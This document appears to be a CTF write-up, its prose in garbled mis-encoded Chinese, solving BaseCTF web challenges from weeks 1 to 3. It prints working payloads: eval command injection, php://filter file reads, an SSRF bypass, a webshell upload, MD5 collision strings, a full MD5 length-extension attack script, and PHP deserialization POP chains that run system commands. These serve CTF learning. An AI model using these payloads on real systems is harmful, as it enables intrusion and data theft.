

### week1å¤ç°

#### A Dark Room

ç›´æ¥f12åœ¨æºä»£ç ä¸­æ‰¾åˆ°ç­”æ¡ˆ

![](https://s2.loli.net/2024/11/04/8NQeoMqiVdyhtjF.png)

#### HTTPæ˜¯ä»€ä¹ˆå‘€

è¿›å…¥åå‘ç°å¦‚ä¸‹å†…å®¹

![](https://s2.loli.net/2024/11/04/aULcrV8FpOGR51Z.png)

##### éœ€è¦æ³¨æ„çš„å‚æ•°

1. getä¼ è¾“æ—¶ï¼Œç½‘é¡µä¼šè‡ªåŠ¨è¿›è¡Œä¸€æ¬¡urlè§£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†%00è¿›è¡ŒäºŒæ¬¡urlåŠ å¯†ï¼Œå¯¹0åŠ å¯†åå˜æˆ%30ï¼Œå³è¾“å…¥%%300
2. cookieåŒæ ·å¯ä»¥ä¼ å‚
   åœ¨burpè¿›è¡Œç›¸åº”ä¿®æ”¹
   ![](https://s2.loli.net/2024/11/04/AjdYPuRBnfO2xDM.png)
   å¾—åˆ°è¿™ä¸€ä¸²å­—ç¬¦ã€‚
   æ ¹æ®æœ«å°¾çš„==çŒœæµ‹å¯èƒ½æ˜¯base64åŠ å¯†
   ä½¿ç”¨burpè‡ªå¸¦çš„è§£å¯†å·¥å…·å¾—åˆ°
   ![](https://s2.loli.net/2024/11/04/cbMxElDSZdnOghz.png)  

#### å–µå–µå–µ

è¿›å…¥åå‘ç°å¦‚ä¸‹ä»£ç 
![](https://s2.loli.net/2024/11/04/a5tXgxbijTUnlPF.png)
å‘ç°é‡ç‚¹å‡½æ•°eval()
æµ‹è¯•ä¹‹åå‘ç°æ²¡æœ‰å±è”½è¿‡æ»¤è¯

```
ï¼ŸDT=system('ls')
```

æ²¡æœ‰å‘ç°ç›¸å…³æ–‡ä»¶ï¼Œäºæ˜¯ç›´æ¥æŸ¥è¯¢æ ¹ç›®å½•

```
ï¼ŸDT=system('ls /')
```

![](https://s2.loli.net/2024/11/04/VbFdGR2ZglLOwy1.png)
å‘ç°flagæ–‡ä»¶
é€‰æ‹©æŸ¥çœ‹flag

```
ï¼ŸDT=system('ls /flag')
```

å¾—åˆ°ç›¸å…³æ–‡ä»¶
![](https://s2.loli.net/2024/11/04/cfysUoCxbj3PhNY.png)

#### Auraé…±çš„ç¤¼ç‰©

è¿›å…¥åå‘ç°å¦‚ä¸‹ä»£ç 

![](https://s2.loli.net/2024/11/08/dTLhvHg7EjWcQFO.png)

##### ä»£ç åˆ†æ

```
$pen = $_POST['pen'];
if (file_get_contents($pen) !== 'Aura')
{
    die('è¿™æ˜¯ Aura çš„ç¤¼ç‰©ï¼Œä½ ä¸æ˜¯ Auraï¼');
}
```

è¿™é‡Œè¦æ±‚è¯»å–çš„æ–‡ä»¶å†…å®¹æ˜¯Aura

é€šè¿‡data://text/plain,xxxxä¼ªåè®®ç»•è¿‡penå‚æ•°çš„å†…å®¹åŒ¹é…

ä¼ å…¥data://text/plain;base64,QXVyYQ==
å¾—åˆ°æç¤ºï¼š
![](https://s2.loli.net/2024/11/17/iUwoPcIxbnFM81h.png)

```
$challenge = $_POST['challenge'];
if (strpos($challenge, 'http://jasmineaura.github.io') !== 0)
{
    die('è¿™ä¸æ˜¯ Aura çš„åšå®¢ï¼');
} 
```

**ssrf**

å‚è€ƒæ–‡ç« ï¼š[https://tttang.com/archive/1648/](https://tttang.com/archive/1648/)

ç»•è¿‡

+ @ç¬¦ï¼Œå¯¹äºä¸€ä¸ª url çš„è®¿é—®å®é™…ä¸Šæ˜¯ä»¥ @ç¬¦åä¸ºå‡†çš„ï¼Œæ¯”å¦‚è¯´[xxxx.com](https://xxxx.com/)@10.10.10.10ï¼Œåˆ™å®é™…ä¸Šè®¿é—®çš„æ˜¯ 10.10.10.10 è¿™ä¸ªåœ°å€ã€‚

+ ç½‘å€ååŠ  xip.ioï¼Œå…¶åŸç†æ˜¯ä¾‹å¦‚ 10.10.10.10.xip.io ä¼šè¢«è§£ææˆ 10.10.10.10ã€‚

+ è¿›åˆ¶è½¬æ¢ï¼Œå°† ip è½¬æ¢æˆå…«è¿›åˆ¶ã€åè¿›åˆ¶ã€åå…­è¿›åˆ¶è¿™ç§ï¼ŒåŒæ ·ä¹Ÿå¯ä»¥æ­£å¸¸è®¿é—®ï¼Œä¾‹å¦‚å°† 10.10.10.10 è½¬æ¢ä¸ºåè¿›åˆ¶æ˜¯ 168430090ï¼Œåœ¨æµè§ˆå™¨è®¿é—® http://168430090 å°±ä¼šå»è®¿é—® 10.10.10.10 è¿™ä¸ªåœ°å€ã€‚

ç¬¬äºŒæ­¥è¦ä»¥ http://jasmineaura.github.io å¼€å¤´,å› ä¸ºåšå®¢æ‰“ä¸å¼€åˆè¦å†é‡Œé¢å†™å†…å®¹,å¯ä»¥ä½¿ç”¨@ ç¬¦å·å°† url åœ°å€è½¬æ¥åˆ°æœ¬æœºä¸Šã€‚ï¼ˆè¿™é‡Œå‚è€ƒäº†å®˜æ–¹wpï¼‰

ç¬¬ä¸‰éƒ¨åˆ†ä½¿ç”¨ä¼ªåè®®è¯»å–æ–‡ä»¶å³å¯ï¼ˆç›¸å…³å†…å®¹å¯åœ¨www.blog000.cnä¸­æ‰¾åˆ°ï¼‰

è¾“å…¥gift=php://filter/read=convert.base64-encode/resource=flag.php
![](https://s2.loli.net/2024/11/17/bNd5M9sVXfyte7x.png)

base64è§£å¯†å³å¯

#### upload

ç›´æ¥çŒœæµ‹æ˜¯ä¸€å¥è¯æœ¨é©¬

ä¸Šä¼ äº†ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ä¹‹åç”¨èšå‰‘é“¾æ¥

![](https://s2.loli.net/2024/11/17/OK56Q8tRPfF4aAp.png)

è¿æ¥æˆåŠŸååœ¨æ–‡ä»¶ä¸­è¿›è¡Œç¿»æ‰¾ï¼Œå‘ç°flagæ–‡ä»¶

![](https://s2.loli.net/2024/11/17/gIuBc9vZjLVWe34.png)

### week2å¤ç°

#### ä¸€èµ·åƒè±†è±†

æ‰“å¼€ç½‘é¡µï¼ŒF12æ— æ³•ä½¿ç”¨ï¼Œæ‰€ä»¥ç›´æ¥å³é”®æŸ¥çœ‹ç½‘é¡µæºä»£ç 

å‘ç°å¦‚ä¸‹

![](https://s2.loli.net/2024/11/08/SyP2JEuT4mcKCpz.png)

åˆ†åˆ«ç‚¹å‡»æŸ¥çœ‹

åœ¨index.jsä¸­å‘ç°å¦‚ä¸‹ä»£ç 

![](https://s2.loli.net/2024/11/08/wjxCZoY8EicGr1A.png)

==å·å¾ˆå¯ç–‘ï¼Œäºæ˜¯è¿›è¡Œbase64è§£ç 

![](https://s2.loli.net/2024/11/08/lV3PcgAUpQftBnY.png)

#### æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5?

***ç”±äºæœ¬é¢˜ä¸­çš„ç›¸å…³çŸ¥è¯†ç‚¹åŒ…å«äº†week1ä¸­çš„çŸ¥è¯†ç‚¹ï¼ˆweek1ç”¨æ­¤é¢˜ä¸­çš„md5æ•°ç»„ç»•è¿‡å³å¯ï¼‰ï¼Œweek1ä¸­çš„md5ç¢°æ’ä¸å†é˜è¿°***

è¿›å…¥ä¾‹é¢˜ï¼Œå¾—åˆ°ç›¸å…³ä»£ç 

![](https://s2.loli.net/2024/11/04/4Hn85siMhBcTDau.png)

```
$apple = $_POST['apple'];
$banana = $_POST['banana'];
if (!($apple !== $banana && md5($apple) === md5($banana))) {
    die('åŠ å¼ºéš¾åº¦å°±ä¸ä¼šäº†?');
} 
```

è¿™ä¸€éƒ¨åˆ†è¦æ±‚ä¸ç›¸ç­‰ä¸”MD5å¼ºç›¸ç­‰
æ‰€ä»¥æˆ‘ä»¬é€‰æ‹©æ•°ç»„ä¼ è¾“ï¼Œä½¿å¾—MD5åŠ å¯†å€¼å¼ºç›¸ç­‰,é€šè¿‡hackerbarè¾“å…¥å¦‚ä¸‹ä»£ç 

```
apple[]=1 && banana[]=2
```

å‡ºç°äº†     éš¾å—ï¼Ÿä¸éš¾çš„æç¤º
è§‚å¯Ÿç¬¬äºŒéƒ¨åˆ†ä»£ç 

```
$apple = (string)$_POST['appple'];
$banana = (string)$_POST['bananana'];
if (!((string)$apple !== (string)$banana && md5((string)$apple) == md5((string)$banana))) {
    die('éš¾å—?ä¸éš¾!'); 
```

è¿™é‡Œæç¤ºæˆ‘ä»¬ä¼šå°†ä¼ å…¥çš„apppleå’Œbanananaéƒ½ä¼šè¢«å¼ºåˆ¶è½¬æ¢æˆstrï¼Œç„¶åå¯¹å…¶è¿›è¡Œè‹¥ç›¸ç­‰md5å’Œæ•°å€¼åˆ¤æ–­

æ€è·¯ï¼šå‡ºç°äº†è½¬æ¢æˆå­—ç¬¦ä¸²å½¢å¼ï¼ŒçŒœæµ‹æ˜¯ä½¿ç”¨0eå¼€å¤´å­—ç¬¦ä¸²é»˜è®¤ä¸º0çš„æ¼æ´ï¼Œè¿™é‡Œä¸Šç½‘æ‰¾åˆ°ä¸¤ä¸ªmd5åŒ–ä¹‹å0eå¼€å¤´çš„å­—ç¬¦ä¸²

```
appple=byGcY&bananana=QNKCDZO
```

å‡ºç°ç¬¬ä¸‰ä¸ªæç¤º

![](https://s2.loli.net/2024/11/04/XWNV36RdmAQED2v.png)

è§‚å¯Ÿç¬¬ä¸‰æ®µä»£ç 

```
$apple = (string)$_POST['apppple'];
$banana = (string)$_POST['banananana'];
if (!((string)$apple !== (string)$banana && md5((string)$apple) === md5((string)$banana))) {
    die('å˜»å˜», ä¸ä¼šäº†? æ²¡çœ‹ç›´æ’­å›æ”¾?');
} 
```

è¿™é‡Œå°†æ¯”è¾ƒç±»å‹æ¢æˆäº†å¼ºæ¯”è¾ƒ

é‚£ä¹ˆçŒœæµ‹å°±æ˜¯è¾“å…¥ä¸¤ä¸ªå®Œå…¨ç›¸ç­‰çš„å­—ç¬¦ä¸²ï¼Œåœ¨ç½‘ä¸Šæ‰¾åˆ°ç›¸å…³å­—ç¬¦ä¸²

```
ten%0D%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%EF%E4%B5h%A7y%95C%60%8A%E0a%0B%B8%3D%D8%26%F5%A3%13%8F%3F%7D%D4%5Cb%81%25v%98%8CHA%05%0D%ED%C2%8B%E7j%EFou%22%01%10c_%AD%F9%5E%84%A5%C1%95%F9K%3E7%7Bdd%C2dT%98V%B1%F2%DD%B6%2C%F2%7B%E8%19%12%9A%29%9D%5D%13Lm%FEN%85%CE%7E%CD%AF%5B%5B%10eA%E9%B0%C4%AA%94%EA%A2%DE%E9%A0%EBP%98%8A%0A_%1D%13%8E%83%DA%C6%97%21%05%82%E7%EA%03_%27%C4
ten%0D%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%EF%E4%B5h%A7y%95C%60%8A%E0a%0B%B8%3D%D8%26%F5%A3%93%8F%3F%7D%D4%5Cb%81%25v%98%8CHA%05%0D%ED%C2%8B%E7j%EFou%22%01%90c_%AD%F9%5E%84%A5%C1%95%F9K%3E7%FBdd%C2dT%98V%B1%F2%DD%B6%2C%F2%7B%E8%19%12%9A%29%9D%5D%13L%ED%FEN%85%CE%7E%CD%AF%5B%5B%10eA%E9%B0%C4%AA%94%EA%A2%DE%E9%A0%EBP%98%0A%0A_%1D%13%8E%83%DA%C6%97%21%05%82%E7j%03_%27%C4
```

å‡ºç°æç¤ºï¼š

![](https://s2.loli.net/2024/11/17/t7ivkuGcYRlmAhE.png)

è¿›å…¥åˆ°ç¬¬å››æ­¥ã€‚å‚è€ƒæ–‡çŒ®([BaseCTFä¹‹webï¼ˆweek2ï¼‰_basectfç¬¬äºŒå‘¨ æ‰€ä»¥ä½ è¯´ä½ æ‡‚md5?-CSDNåšå®¢](https://blog.csdn.net/qq_74350234/article/details/141757892?ops_request_misc=%7B%22request%5Fid%22%3A%22C27CC3F1-B5A6-4922-8413-717AA35708CA%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=C27CC3F1-B5A6-4922-8413-717AA35708CA&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-141757892-null-null.142^v100^pc_search_result_base4&utm_term=æ‰€ä»¥ä½ è¯´ä½ æ‡‚ md5&spm=1018.2226.3001.4187))
è„šæœ¬æºç 

```python
from struct import pack, unpack
from math import floor, sin
 
 
"""
MD5 Extension Attack
====================
@refs
https://github.com/shellfeel/hash-ext-attack
"""
 
 
class MD5:
 
    def __init__(self):
        self.A, self.B, self.C, self.D = \
            (0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476)  # initial values
        self.r: list[int] = \
            [7, 12, 17, 22] * 4 + [5,  9, 14, 20] * 4 + \
            [4, 11, 16, 23] * 4 + [6, 10, 15, 21] * 4  # shift values
        self.k: list[int] = \
            [floor(abs(sin(i + 1)) * pow(2, 32))
             for i in range(64)]  # constants
 
    def _lrot(self, x: int, n: int) -> int:
        # left rotate
        return (x << n) | (x >> 32 - n)
 
    def update(self, chunk: bytes) -> None:
        # update the hash for a chunk of data (64 bytes)
        w = list(unpack('<'+'I'*16, chunk))
        a, b, c, d = self.A, self.B, self.C, self.D
 
        for i in range(64):
            if i < 16:
                f = (b & c) | ((~b) & d)
                flag = i
            elif i < 32:
                f = (b & d) | (c & (~d))
                flag = (5 * i + 1) % 16
            elif i < 48:
                f = (b ^ c ^ d)
                flag = (3 * i + 5) % 16
            else:
                f = c ^ (b | (~d))
                flag = (7 * i) % 16
 
            tmp = b + \
                self._lrot((a + f + self.k[i] + w[flag])
                           & 0xffffffff, self.r[i])
            a, b, c, d = d, tmp & 0xffffffff, b, c
 
        self.A = (self.A + a) & 0xffffffff
        self.B = (self.B + b) & 0xffffffff
        self.C = (self.C + c) & 0xffffffff
        self.D = (self.D + d) & 0xffffffff
 
    def extend(self, msg: bytes) -> None:
        # extend the hash with a new message (padded)
        assert len(msg) % 64 == 0
        for i in range(0, len(msg), 64):
            self.update(msg[i:i + 64])
 
    def padding(self, msg: bytes) -> bytes:
        # pad the message
        length = pack('<Q', len(msg) * 8)
 
        msg += b'\x80'
        msg += b'\x00' * ((56 - len(msg)) % 64)
        msg += length
 
        return msg
 
    def digest(self) -> bytes:
        # return the hash
        return pack('<IIII', self.A, self.B, self.C, self.D)
 
 
def verify_md5(test_string: bytes) -> None:
    # (DEBUG function) verify the MD5 implementation
    from hashlib import md5 as md5_hashlib
 
    def md5_manual(msg: bytes) -> bytes:
        md5 = MD5()
        md5.extend(md5.padding(msg))
        return md5.digest()
 
    manual_result = md5_manual(test_string).hex()
    hashlib_result = md5_hashlib(test_string).hexdigest()
 
    assert manual_result == hashlib_result, "Test failed!"
 
 
def attack(message_len: int, known_hash: str,
           append_str: bytes) -> tuple:
    # MD5 extension attack
    md5 = MD5()
 
    previous_text = md5.padding(b"*" * message_len)
    current_text = previous_text + append_str
 
    md5.A, md5.B, md5.C, md5.D = unpack("<IIII", bytes.fromhex(known_hash))
    md5.extend(md5.padding(current_text)[len(previous_text):])
 
    return current_text[message_len:], md5.digest().hex()
 
 
if __name__ == '__main__':
 
    message_len = int(input("[>] Input known text length: "))
    known_hash = input("[>] Input known hash: ").strip()
    append_text = input("[>] Input append text: ").strip().encode()
 
    print("[*] Attacking...")
 
    extend_str, final_hash = attack(message_len, known_hash, append_text)
 
    from urllib.parse import quote
    from base64 import b64encode
 
    print("[+] Extend text:", extend_str)
    print("[+] Extend text (URL encoded):", quote(extend_str))
    print("[+] Extend text (Base64):", b64encode(extend_str).decode())
    print("[+] Final hash:", final_hash)
```

æŒ‰ç…§å¦‚ä¸‹è¿›è¡Œç¼–å†™
![](https://s2.loli.net/2024/11/17/Ex6IqnfMo2R3DHj.png![](https://s2.loli.net/2024/11/17/FvKIm1OecPDVERC.png)

å°†urlç²˜è´´åˆ°nameï¼Œå°†hashç²˜è´´åˆ°md5å³å¯

![](https://s2.loli.net/2024/11/17/fwsntA8qua6HS9N.png)



#### ä½ å¬ä¸è§æˆ‘çš„å£°éŸ³

æ‰“å¼€ç½‘å€ï¼Œå‘ç°å¦‚ä¸‹å†…å®¹ï¼š

![](https://s2.loli.net/2024/11/17/FjBGrkQADuToK2q.png)

é€šè¿‡shell_execå‡½æ•°å¯çŸ¥ï¼Œè¿™æ˜¯ä¸€ä¸ªæ— å›æ˜¾shellï¼Œå¯é€šè¿‡å°†flagæ–‡ä»¶è¯»å–åç›´æ¥å†™å…¥txtæ–‡ä»¶ä¸­

å†™å…¥åç›´æ¥è®¿é—®1.txtå¾—åˆ°flag

##### PHPæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„4ä¸ªæ–¹æ³• :

system å‡½æ•°ï¼šsystem å‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶å°†è¾“å‡ºç›´æ¥æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºã€‚å®ƒçš„è¿”å›å€¼æ˜¯å‘½ä»¤çš„æœ€åä¸€è¡Œè¾“å‡ºæˆ–è€…è¿”å›çŠ¶æ€ç ï¼ˆå‘½ä»¤æˆåŠŸæ‰§è¡Œè¿”å›0ï¼‰ã€‚



shell_exec å‡½æ•°ï¼šshell_exec å‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä½†å®ƒå°†å‘½ä»¤çš„è¾“å‡ºä½œä¸ºå­—ç¬¦ä¸²è¿”å›ï¼Œè€Œä¸æ˜¯æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºã€‚å¦‚æœå‘½ä»¤æ²¡æœ‰è¾“å‡ºï¼Œåˆ™è¿”å›ç©ºå­—ç¬¦ä¸²ã€‚



exec å‡½æ•°ï¼šexec å‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶å°†è¾“å‡ºå­˜å‚¨åˆ°ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œæ¯ä¸€è¡Œå‘½ä»¤è¾“å‡ºä½œä¸ºæ•°ç»„çš„ä¸€ä¸ªå…ƒç´ ã€‚å®ƒçš„è¿”å›å€¼æ˜¯å‘½ä»¤çš„æœ€åä¸€è¡Œè¾“å‡ºæˆ–è€…è¿”å›çŠ¶æ€ç ã€‚



passthru å‡½æ•°ï¼špassthru å‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶ç›´æ¥å°†å‘½ä»¤çš„è¾“å‡ºå‘é€åˆ°æ ‡å‡†è¾“å‡ºã€‚å®ƒä¸ä¼šè¿”å›ä»»ä½•è¾“å‡ºç»“æœï¼Œè€Œæ˜¯ç›´æ¥å°†è¾“å‡ºæ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚

å½“å‘½ä»¤æ‰§è¡Œæ–¹å¼ä¸ºexceæˆ–è€…shell_exceä¹‹ç±»çš„æ— å›æ˜¾å‡½æ•°æ—¶ï¼Œæˆ‘ä»¬æœ‰ä»¥ä¸‹ä¸¤ç§è§£å†³æ–¹æ¡ˆ

###### ç”¨ncè¿›è¡Œshellåå¼¹

###### å†™å…¥æ–‡ä»¶åè¿›è¡Œè®¿é—®

åœ¨è¿›è¡Œäº†æ­£å¸¸æ“ä½œå®ŒæˆflagæŸ¥è¯¢ä¹‹åå‘ç°æ²¡æœ‰å›æ˜¾

é‚£ä¹ˆæˆ‘ä»¬é™¤äº†ncçš„shellå›æ˜¾ä¹‹å¤–ï¼Œè¿˜èƒ½é‡‡å–æ–‡ä»¶è¯»å–çš„æ–¹æ³•

ä¾‹å¦‚

æ­£å¸¸è¾“å…¥  ?cmd= tac /f*

å‘ç°æ˜¯ç”¨shell_exce()å‡½æ•°è¿›è¡Œçš„å‘½ä»¤æ‰§è¡Œ,æ— å›æ˜¾æ˜¾ç¤º

é‚£ä¹ˆæˆ‘ä»¬ç”¨>ç¬¦å·å°†flagå†™å…¥1.txtï¼ˆéšä¾¿å†™ä¸€ä¸ªæ–‡ä»¶åä¹Ÿè¡Œï¼‰

?cmd=tac /f* > 1.txt

è®¿é—® 1.txtå³å¯

#### ez_ser

å‘ç°ä»£ç ï¼Œæœ‰é¢˜ç›®å¯çŸ¥ï¼Œè¿™æ˜¯ä¸€é“ç®€å•çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–é¢˜ç›®

æ„é€ popé“¾ï¼š

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

class re{
    public $chu0;
    public function __toString(){ //è°ƒç”¨å­—ç¬¦ä¸²
        if(!isset($this->chu0)){
            return "I can not believes!";
        }
        $this->chu0->$nononono;  // 2 __getâ€”â€”>pwn
    }
}

class web {
    public $kw;
    public $dt;

    public function __wakeup() {
        echo "lalalla".$this->kw;   //3 __tostring-->re
        }

    public function __destruct() {
        echo "ALL Done!";
    }
}

class pwn {
    public $dusk=gods;    //dusk=gods
    public $over;
    public function __get($name) {     //æ‰¾ä¸å¯è®¿é—®çš„å¯¹è±¡ 
        if($this->dusk != "gods"){
            echo "ä»€ä¹ˆï¼Œä½ ç«Ÿæ•¢ä¸è®¤å¯?";
        }
        $this->over->getflag();    // 1 Misc 
    }
}

class Misc {
    public $nothing;
    public $flag;

    public function getflag() {
        eval("system('cat /flag');");      //0 ç›®çš„åœ°
    }
}

class Crypto {
    public function __wakeup() {
        echo "happy happy happy!";
    }

    public function getflag() {
        echo "you are over!";
    }
}
$ser = $_GET['ser'];   //è§¦å‘get
unserialize($ser);
```

##### æ„é€ popé“¾ï¼š

webä¸­çš„__wakeup()->reä¸­çš„chu0->pwnä¸­çš„over-> Misc ä¸­çš„ getflag()

äºæ˜¯åŠ ä¸Šä»¥ä¸‹ä»£ç å¹¶å°†å®šä¹‰duckçš„ä»£ç ä¸­duckçš„å€¼ç›´æ¥ä¿®æ”¹ä¸ºgodsï¼ˆçœå»åç»­ä¿®æ”¹æ­¥éª¤ï¼‰

```php
$w = new web;
$r = new re;
$p = new pwn;
$m = new Misc;
$p->over = $m;
$r->chu0 = $p;
$p->over = $m;
echo serilize($w)
```

è¾“å‡ºç»“æœä¸º

O:3:"web":2:{s:2:"kw";O:2:"re":1:{s:4:"chu0";O:3:"pwn":2:{s:4:"dusk";N;s:4:"over";O:4:"Misc":2:{s:7:"nothing";N;s:4:"flag";N;}}}s:2:"dt";N;}

å¾—åˆ°flag

####  RCEisamazingwithspace

```php
 <?php
highlight_file(__FILE__);
$cmd = $_POST['cmd'];
// check if space is present in the command
// use of preg_match to check if space is present in the command
if (preg_match('/\s/', $cmd)) {
    echo 'Space not allowed in command';
    exit;
}

// execute the command
system($cmd); 
```

å‘ç°å±è”½äº†ç©ºæ ¼ç¬¦å·

'\s'è¡¨ç¤ºå¯ä»¥åŒ¹é…ä»»æ„ä¸€ä¸ªç©ºç™½å­—ç¬¦ï¼Œå°±æ¯”å¦‚è¯´ï¼šæ¢é¡µç¬¦ã€æ¢è¡Œç¬¦ã€å›è½¦å’Œåˆ¶è¡¨ç¬¦ç­‰ã€‚

è¿™é‡Œå°è¯•äº†å„ç§ç»•è¿‡ï¼Œå‘ç°åªæœ‰${IFS}å¯ä»¥

è¾“å…¥è·å¾—flag

![](https://s2.loli.net/2024/11/16/1JORp6hqAge72ir.png)

#### æ•°å­¦å¤§å¸ˆ

å‘ç°éœ€è¦æˆ‘ä»¬ä¸æ–­åœ¨3så†…ç­”å‡ºåŠ å‡ä¹˜é™¤ï¼Œè¿™é‡Œä½¿ç”¨aiè¾…åŠ©å†™å‡ºäº†ä¸€ä¸ªè„šæœ¬

```php
import requests
import re
import time

# è®¾ç½®ä¼šè¯å¯¹è±¡
session = requests.Session()

# ç›®æ ‡ç½‘å€
url = 'http://gz.imxbt.cn:20472/'


def get_question(html):
    # ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ä»HTMLä¸­æå–æ•°å­¦é—®é¢˜
    match = re.search(r'Tell me in \d+ second (\d+)([+\-*/Ã·Ã—])(\d+)', html)
    if match:
        num1 = int(match.group(1))
        num2 = int(match.group(3))
        operator = match.group(2)
        return num1, num2, operator
    return None, None, None


def solve_question(num1, num2, operator):
    # æ ¹æ®æ“ä½œç¬¦è®¡ç®—ç»“æœ
    if operator == '+':
        return num1 + num2
    elif operator == '-':
        return num1 - num2
    elif operator == '*' or operator == 'Ã—':
        return num1 * num2
    elif operator == '/' or operator == 'Ã·':
        return num1 // num2  # æ•´æ•°é™¤æ³•
    return None


def main():
    for i in range(50):  # å¾ªç¯50æ¬¡ï¼Œè§£å†³50ä¸ªé—®é¢˜
        start_time = time.time()

        if i == 0:
            # ç¬¬ä¸€æ¬¡è·å–é¡µé¢å†…å®¹
            response = session.get(url)
            question_html = response.text
            print(f"è·å–é¡µé¢å†…å®¹æˆåŠŸï¼Œç¬¬ {i + 1} é¢˜: {question_html}")
        else:
            # ä»ä¸Šæ¬¡å‘é€ç­”æ¡ˆåçš„å“åº”ä¸­æå–æ–°çš„é—®é¢˜
            question_html = response.text
            print(f"è·å–é¡µé¢å†…å®¹æˆåŠŸï¼Œç¬¬ {i + 1} é¢˜: {question_html}")

        # è·å–å¹¶è§£ææ•°å­¦é—®é¢˜
        num1, num2, operator = get_question(question_html)
        if num1 is None or num2 is None or operator is None:
            print('æ— æ³•è·å–æ•°å­¦é—®é¢˜')
            print(f"é—®é¢˜è§£æå¤±è´¥ï¼Œå½“å‰HTMLå†…å®¹: {question_html}")
            break

        print(f"è§£æåˆ°çš„é—®é¢˜: {num1} {operator} {num2}")

        # è®¡ç®—ç­”æ¡ˆ
        answer = solve_question(num1, num2, operator)
        if answer is None:
            print('æ— æ³•è®¡ç®—ç­”æ¡ˆ')
            break

        print(f"è®¡ç®—çš„ç­”æ¡ˆ: {answer}")

        # å‘é€ç­”æ¡ˆ
        data = {'answer': answer}
        response = session.post(url, data=data)
        print(f"å‘é€ç­”æ¡ˆæˆåŠŸï¼ŒæœåŠ¡å™¨å“åº”: {response.text}")

        end_time = time.time()
        elapsed_time = end_time - start_time
        if elapsed_time < 3:  # å¦‚æœå¤„ç†æ—¶é—´å°äº3ç§’ï¼Œåˆ™ç­‰å¾…å‰©ä½™çš„æ—¶é—´
            time.sleep(3 - elapsed_time)


if __name__ == '__main__':
    main()
```

è¿™æ˜¯ç­”é¢˜ç»“æœ
![](https://s2.loli.net/2024/11/17/lXeSxiCkhRH4FE6.png)

#### Realy ez PoP



```php
<?php
error_reporting(0);
 
class Sink
{
    private $cmd = 'echo 123;';
    public function __construct()
    {
        $this->cmd = "system('ls /');";
    }
    public function __toString()
    {
        eval ($this->cmd);
    }
}
 
class Shark
{
    private $word = 'Hello, World!';
    public function __construct()
    {
        $this->word = new Sink();
    }
    public function __invoke()
    {
        echo 'Shark says:' . $this->word;
    }
}
 
class Sea
{
    public $animal;
    public function __construct()
    {
        $this->animal = new Shark();
    }
    public function __get($name)
    {
        $sea_ani = $this->animal;
        echo 'In a deep deep sea, there is a ' . $sea_ani();
    }
}
 
class Nature
{
    public $sea;
    public function __construct()
    {
        $this->sea = new Sea();
    }
    public function __destruct()
    {
        echo $this->sea->see;
    }
}
$ser = new Nature();
echo urlencode(serialize($ser));
```

è·å¾—å¦‚ä¸‹ä»£ç 

nature=O%3A6%3A%22Nature%22%3A1%3A%7Bs%3A3%3A%22sea%22%3BO%3A3%3A%22Sea%22%3A1%3A%7Bs%3A6%3A%22animal%22%3BO%3A5%3A%22Shark%22%3A1%3A%7Bs%3A11%3A%22%00Shark%00word%22%3BO%3A4%3A%22Sink%22%3A1%3A%7Bs%3A9%3A%22%00Sink%00cmd%22%3Bs%3A15%3A%22system%28%27ls+%2F%27%29%3B%22%3B%7D%7D%7D%7D

![](https://s2.loli.net/2024/11/17/Ba9KOikJPYof7sb.png)

ä¹‹åå°†æ–‡ä»¶ä¸­çš„ls /æ›´æ”¹ä¸ºcat /flagè¾“å‡ºååºåˆ—åŒ–ä¹‹åå³å¯è·å¾—flag

![](https://s2.loli.net/2024/11/17/JrNLZXDC6RTK74m.png)

![](https://s2.loli.net/2024/11/17/Ba9KOikJPYof7sb.png)
### Week3

#### ç©åŸç¥ç©çš„

```
 <?php
highlight_file(__FILE__);
error_reporting(0);

include 'flag.php';
if (sizeof($_POST['len']) == sizeof($array)) {
  ys_open($_GET['tip']);
} else {
  die("é”™äº†ï¼å°±ä½ è¿˜æƒ³ç©åŸç¥ï¼ŸâŒâŒâŒ");
}

function ys_open($tip) {
  if ($tip != "æˆ‘è¦ç©åŸç¥") {
    die("æˆ‘ä¸ç®¡ï¼Œæˆ‘è¦ç©åŸç¥ï¼ğŸ˜­ğŸ˜­ğŸ˜­");
  }
  dumpFlag();
}

function dumpFlag() {
  if (!isset($_POST['m']) || sizeof($_POST['m']) != 2) {
    die("å¯æ¶çš„QQäººï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡");
  }
  $a = $_POST['m'][0];
  $b = $_POST['m'][1];
  if(empty($a) || empty($b) || $a != "100%" || $b != "love100%" . md5($a)) {
    die("æŸç«™å´©äº†ï¼Ÿè‚¯å®šæ˜¯æŸå¿½æ‚ å¹²çš„ï¼ğŸ˜¡ğŸ˜¡ğŸ˜¡");
  }
  include 'flag.php';
  $flag[] = array();
  for ($ii = 0;$ii < sizeof($array);$ii++) {
    $flag[$ii] = md5(ord($array[$ii]) ^ $ii);
  }
  
  echo json_encode($flag);
} é”™äº†ï¼å°±ä½ è¿˜æƒ³ç©åŸç¥ï¼ŸâŒâŒâŒ

